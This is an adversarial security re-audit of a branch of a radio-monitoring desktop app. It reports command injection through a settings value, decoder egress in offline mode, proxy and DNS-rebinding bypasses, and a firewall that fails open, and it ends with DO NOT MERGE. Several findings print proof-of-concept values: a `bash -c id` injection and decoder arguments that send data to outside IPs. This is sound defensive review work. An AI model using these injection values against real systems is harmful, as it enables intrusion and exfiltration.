# RA-CL8 — cold re-audit of `fix/cl8-ship`

Auditor: fresh session, adversarial. Branch audited at `889b7ed` (code); `f88a1ff`/`9d51005` add only
`CL8-report.md`. Base `origin/main` = `1bc8ad1`. Python 3.13.18, PySide6, offscreen + xvfb.
Author's report read only after steps 1–3.

**Verdict: DO NOT MERGE.** Three blockers from the RA-CL8 list reproduce: a settings value still
reaches a shell (Scout `wifi_cmd`), settings templates still steer pinned decoders to send data
off the device in OFFLINE (rtl_433 / acarsdec / dumpvdl2 network outputs), and a malformed
setting leaves BABEL holding the radio in a 1 Hz retry loop that is labelled "no capture
(offline)". A fourth item fails open: `harden.sh --field` / `--revert` turn the firewall off
first and only turn it back on if every later step succeeds.

## Suite

`QT_QPA_PLATFORM=offscreen xvfb-run -a python3 -m pytest -q -p no:cacheprovider tests` (temp HOME):
**1556 passed, 7 skipped, 2 failed, 7 errors in 685 s**. The failures and errors are all baseline
(the same on main because of this environment): `test_audit_tiles::test_undecodable_tile_is_marked_failed`,
`test_hwlab::test_doctor_hwbench_check`, and 7 × `test_shell` (no tkinter). `tests/test_cl8_ship.py`:
all pass.

Test diff against `1bc8ad1`: every weakened or changed assertion maps to a CL8 change that the
report lists. These are SWEEP hidden (`PALISADE_SHOW_HIDDEN=1` in the SWEEP tests, CALLSIGNS
7/ALL 8), the P3 amber-then-red drone, the C1 token in the headless tests, the AIS checksum
correction `*5C→*5F`, the L3 `PALISADE_NET=ONLINE` in the three network-failure tests, the OPSEC
placeholder replaced by NET, the A4 literal argv (identical to main's split), and
`test_plugins.py` deleted with `plugins.py`. I found no weakening that the changes do not justify.

## Per ID

| ID | Status | Evidence | Test |
|---|---|---|---|
| **L4** | **OPEN** | (a) Shell from a settings file: `scout.py:322` runs `subprocess.run(cmd.split())` on `scout.json` `wifi_cmd` (`scout.py:646`). PoC `scout.wifi_scan('bash -c id>/tmp/claude-0/ra/pwned_scout')` wrote `uid=0(root)…`. Scout is still a Tk hub tile. The source-scan test only looks for `"sh","-c"` literals, so it misses this. (b) Argument injection through a pinned program: `argsafe._SAFE_TOKEN` (`argsafe.py:25`) allows `:`/`=`/`,`, so `signals.build_argv` accepts `rtl_433 -F syslog:203.0.113.5:514`, `rtl_433 -F mqtt:203.0.113.5:1883,…`, `rtl_433 -w capture.cu8 -c evil.conf`, `acarsdec --output json:udp:address=203.0.113.5,port=5555`, `dumpvdl2 --output decoded:json:udp:address=…`. All are ACCEPTED, and Qt BABEL › ACARS uses this builder (`babel.py` `_run_acars`). These are UDP/TCP egress outside `netpolicy` (see L3). (c) Malformed (not "refused") settings hold the radio: see NEW-1. What is fixed: the `pager.json` PoC is refused by every builder, there is no `shell=True`/`sh -c` in the decoders, and PipeGroup works (see the design attacks). | `test_l4_*` pass, but no test covers (a), (b) or (c) |
| **C1** | CLOSED | Without the token, every route is 401 (`/`, `/api/*`, `/static/x`, OPTIONS, HEAD, `//api/status`, `/api/status/`, case variants). `?token=` is accepted only on `/`. A wrong last character gives 401 (`hmac.compare_digest`, `headless.py` `_authorized`). `make_app(token=None)` raises. `headless.json` is written 0600 (`_save_private`). The dashboard uses `textContent` only, and the CSP is set. Hygiene: the token travels over plain HTTP in a URL, there is no rotation, any ≥16-char user token is accepted, and the token sits in backups. | `test_c1_*`, `test_headless` |
| **L3** | **OPEN** | (a) Blocker: settings-driven decoder egress in OFFLINE (L4b), not routed through `netpolicy`. (b) An OFFLINE loopback request goes off-device when a proxy env var is set: with `http_proxy=http://203.0.113.9:3128`, `netpolicy.urlopen("http://127.0.0.1:11434/…")` connected to `('203.0.113.9', 3128)`. `_install_opener` (`netpolicy.py:218`) keeps urllib's default ProxyHandler. (c) LAN-mode DNS rebinding: `allowed()` resolves once (`netpolicy.py:171`) and urllib resolves again. PoC: the first answer was 192.168.1.5 and the second 203.0.113.7, so it connected to 203.0.113.7 and the log says "allowed". (d) DNS outside the mode: `engagement._resolve` (`engagement.py:73`) and `scout.py:227` `gethostbyaddr`. Non-HTTP clients (devterm MQTT, mesh_dash TCP) ignore the mode, yet the NET note says "Nothing leaves the device". Fixed: every `urlopen` routes through netpolicy, OFFLINE never resolves, non-http schemes are refused, redirects are re-checked. | `test_l3_*` (source scan only for urllib patterns; nothing for proxies, rebinding or subprocess egress) |
| **L2** | **PARTIAL** | `--revert` no longer runs `ufw disable`, and `--field` adds no allow rules (stubbed run: reset, deny in, allow out, enable). But `harden.sh:62` `ufw --force reset` **disables** ufw (ufw(8)), and under `set -e` any later failure exits with the firewall off. PoC with stubbed `sudo` that fails `ufw default`: the log shows `ufw --force reset`, `ufw default deny incoming`, then rc=1, and no `enable` ever ran. Pre-existing Low: `--dry-run --yes` applies the HOME profile (the last flag wins). The HOME profile never resets, so allow rules for an old subnet persist. | `test_l2_*` (success path only) |
| **L6** | **PARTIAL** | No more symlink: `/usr/local/bin/{palisade,hub,sky}` are root-owned files. But the wrapper does `cd "$APP"; exec python3 $APP/hub.py` (`install_tail.sh:34`), and `$APP` is user-writable. Whoever could edit `~/.local/bin/hub` can edit `$APP/hub.py`, so what `sudo hub`/root runs is still user-controlled. The comment's threat is unchanged. Regression: line 40 deletes the old `~/.local/bin/sky`, then line 80 points an existing `sky.desktop` at `$HOME/.local/bin/sky`, which leaves a dead menu entry on upgrade. | `test_l6_*` (string check only) |
| **S1** | CLOSED | Built `build_installer.sh /tmp/…/x.sh`: `bash -n` OK, and the payload has `palisade_qt/` (incl. `kit/`, `release.py`, `sessionlog.py`), `argsafe.py`, `netpolicy.py`, no `plugins.py`, no `__pycache__`. The tail compile-checks `palisade_qt/**`. The head installs numpy/pyqtgraph/PySide6 (apt, then pip) and flask. A PALISADE menu entry is the default; the Tk hub is "legacy". Not run. | `test_s1_*` |
| **S4** | CLOSED | On 3.13.18 with real libcrypt (ctypes), sha512/yescrypt/sha256 hashes of "dragon" are flagged and a unique password passes. There is no `crypt`/`spwd` import. Low: when `crypt_fn` returns None (an unsupported hash type) for every guess, the result is "not a common default" (`doctor.py:728`), a false OK instead of "unavailable". | `test_s4_*` |
| **C4** | **PARTIAL** | Worker `on_error`/`on_fault`, parked workers, uncaught sys/thread exceptions, FORGE serial read/write and arbiter release errors all reach `session.log` and the MODE ▲ indicator (rendered). But the indicator can clear unseen: opening the panel calls `mark_seen()` for **all** faults (`panels.py:661`, `sessionlog.py:92`), whatever is on screen. PoC (every theme): 1 FAULT, then 40 NET rows, open the log, `faults_unseen` goes 1→0, and the FAULT row is not among the 10 visible rows (render `session_log_*_live.png`). NET rows dedupe only within 60 s, so in ONLINE they grow about 1 per host per minute. Also, `except Exception: pass` in `palisade_qt` went from 34 to 36. `forge._serial_ports` still silently falls back to "demo". | `test_c4_*` |
| **C5** | PARTIAL (Low) | `plugins.py` and its loader are gone, and offscreen has one copy (`kit/seams.py`). Settings loading is still duplicated (`babel.py:126` `_load_settings`, `prowl.py:795`), and AIS/RDS are still run twice (the author flagged this). | `test_c5_*` |
| **P1** | CLOSED | `^BSS <mac>` anchored with a lookahead (`wifisurvey.py:16`). An SSID `BSS de:ad:be:ef:00:01` no longer adds a row or blanks the real AP. | `test_p1_*` |
| **P2** | CLOSED | Privacy bit plus AKM gives WEP / WPA / WPA2-PSK / WPA3-SAE / transition / EAP / OWE. RSN section tracking ends at the next top-level IE. | `test_p2_*` (11 cases) |
| **P3** | CLOSED (Qt) | A single advert gives `severity=warn`, `trust=unconfirmed`, the amber `id ?` label and a card reading UNCONFIRMED · 1 advert. OPS colours by severity, so it is amber too. No ATLAS/OPS alert is published for RID. AIS needs a valid checksum. Low: the standalone Tk `dronewatch.py` (not on any hub/menu) still fires "Drone detected" (banner + speak + notify) on one advert (PoC: `adverts: 1`, 1 alert). | `test_p3_*`, `test_palisade_qt::test_rid_source…` |
| **B4** | PARTIAL | `set_rows` now keeps the selection and the top visible item (PoC: top r100 / selected r105 kept). But `FeedModel.prepend` (used by the BABEL decode feed `babel.py:1213` and PROWL NWR `prowl.py:1298`) still moves the view: after 5 prepends while scrolled, the top went r100→r95. The reading position drifts 1 row per decode in the busiest table. Arrow keys were already fixed on main. | `test_b4_*` (set_rows only) |
| **B5** | CLOSED | Clicking a contact emits `contact_clicked`, and a second click clears it. The sweep line and its timer are gone. | `test_b5_*` |
| **B6** | CLOSED | `rtl_433 … -f 315M -f 433.92M -H 30`, hop_s checked 5–600; overlapping map labels skipped. | `test_b6_*` |
| **E6** | CLOSED | The search starts 30 min back and keeps passes with `los > now` (`in_progress`). The capture loop `wxsat.py:625` starts an in-progress pass at once. | `test_e6_a_pass_in_progress_is_kept` |
| v0.1: SWEEP hidden | CLOSED (Qt) | Not on the strip, keys 1–7, palette or `open_callsign("SWEEP")`; digits 8/9/0 do nothing. Hygiene: KeyMap still says "1 – 8" (`panels.py:752`). | `test_v01_sweep_is_hidden…` |
| v0.1: Tk gated tools retired | **REGRESSED** | Only `TILES`/`Shell.MODS` were filtered. The Tk hub's home grid is built from `GROUPS` (`hub.py:836`), which still lists all ten (`cw`…`hid`, e.g. `hub.py:849`, `:883`). Clicking one calls `launch(key, CMD.get(key))`, where CMD comes from the filtered TILES (`hub.py:832`). The result is `cmd=None`, then `os.path.exists(cmd[1])` (`hub.py:788`) raises `TypeError` in a Tk callback. The tool is still shown but now dead with no message. The test checks only TILES/MODS. Related: the Tk hub still ships Bug Sweep / Jamming / IMSI / GNSS, the same unvalidated detectors that SWEEP is hidden for. | `test_retired_tk_gated_tools…` (insufficient) |

## Design attacks (step 2)

- **PipeGroup with real processes:** pass. A missing stage 2 or 3 kills the started stages (no
  orphan `sleep`). One pgid and one sid per group. `stop_group` kills a stage that traps INT/TERM
  (SIGKILL after 5 s). A dead stage 1 with a live stage 2 still gets stopped. Hygiene: stderr of
  the earlier stages goes to DEVNULL, so rtl_fm's "usb_claim_interface" never reaches the fault
  banner. That was the same with main's `2>/dev/null`.
- **BABEL/PROWL refusal:** an argsafe refusal releases the lease once with no retry (pass). A
  malformed value raises something other than `SettingsRefused` and holds the radio: NEW-1.
- **Strip at 1280:** worst case (longest owner and scope, 128 alerts, every NET mode, fault on/off),
  live and demo: dark 1247, light 1247, sun 1255 px (≤ 1270). Pass. Pages render 1280×720 with no
  overflow (OPS, ATLAS, RECON, PROWL, SYSTEM, SESSION LOG; dark/light/sun).
- **Remote ID:** a single advert never turns red or alerts in Qt (pass). The 3 adverts / 2 s
  threshold is trivially met by one spoofing transmitter. That is by design and the label says
  UNAUTHENTICATED.
- **Threads:** netpolicy listeners run on the requesting thread. `_NetBridge` and `SessionLog`
  emit signals, which are delivered queued to GUI-thread receivers. I found no Qt widget touched
  off its thread. LAN-mode `allowed()` calls blocking `getaddrinfo` on the caller's thread, so a
  future GUI-thread caller would freeze the UI.

## NEW findings (not in the 93)

**NEW-1 · High (blocks: radio held after a refusal).** A malformed setting holds the radio in a
1 Hz retry loop labelled "no capture (offline)". `signals.build_argv` catches only
KeyError/IndexError/ValueError/AttributeError (`signals.py:188`), and `tpms_argv` iterates
`freqs` unchecked. The resulting TypeError reaches the generic `except` (`babel.py:600`). The
worker then takes the offscreen-seam branch (`babel.py:614`): it keeps the lease (readsb stays
paused), naps 1 s and retries forever, with no FAULT and no "SETTINGS REFUSED". PoC
(`DecoderWorker`, fake binaries, as in `test_l4_babel_refuses…`):
`signals.json {"source":"sensors","rtl433_cmd":"rtl_433 {gain[0]}"}`, `{"source":"acars","acars_freqs":5}`
and `tpms.json {"freqs":5}` each gave `owner: BABEL` after 3.5 s, `released: []`, 4 errors, last
status `"<MODE> — no capture (offline)"`.

**NEW-2 · High (blocks: an outbound request in OFFLINE).** Settings-template egress, detailed in
L4(b) and L3(a). `rtl_433 -F syslog:/mqtt:`, `acarsdec --output …udp:address=`,
`dumpvdl2 --output …udp:` pass `safe_tokens`, and the decoded traffic leaves the device while
NET shows OFF.

**NEW-3 · Critical per RA-CL8 list (a settings value that reaches a shell).** `scout.json`
`wifi_cmd` → `bash -c …`, detailed in L4(a). This was not cited in the audit's L4 file list.

**NEW-4 · Medium (fails open).** `harden.sh --field`/`--revert` disable the firewall before
re-enabling it; see L2.

**NEW-5 · Medium.** An OFFLINE request goes off-device through an env proxy; see L3(b).

**NEW-6 · Medium.** LAN-mode DNS rebinding (check and connect resolve separately); see L3(c).

**NEW-7 · Medium.** Opening SESSION LOG clears the fault indicator for faults that are not on
screen; see C4.

**NEW-8 · Medium.** Retired Tk tools are still displayed and now throw `TypeError` on click; see
the v0.1 Tk row. Unvalidated TSCM detectors are still offered in the Tk hub.

**NEW-9 · Low.** The installer upgrade leaves `sky.desktop` pointing at the deleted
`~/.local/bin/sky` (`install_tail.sh:40` and `:80`).

**NEW-10 · Low.** BABEL/NWR feed prepend drifts the scroll position (B4 remainder).

**NEW-11 · Low.** `doctor.chk_default_password` reports OK when crypt cannot hash (`doctor.py:728`).

**NEW-12 · Low.** KeyMap says "1 – 8" with 7 pages. The NET slot only follows mode changes made
in this process, not a `net.json` changed by another one. Legacy Tk apps have no NET control:
OFFLINE silently disables Sky routes, METAR and tiles there.

## Blocking list (from RA-CL8 step 5)

1. A settings value reaches a shell: **Scout `wifi_cmd`**.
2. An outbound request in OFFLINE: **decoder output templates**. Conditional: an env proxy.
3. A radio held after a refusal: **NEW-1**.
4. A harden profile that disables the firewall: **reset-then-enable fails open (NEW-4)**.

Not blocking: the Remote Mode routes (all authenticated), the strip (≤ 1255 px), and a red drone
from one advert (none in Qt).

DO NOT MERGE
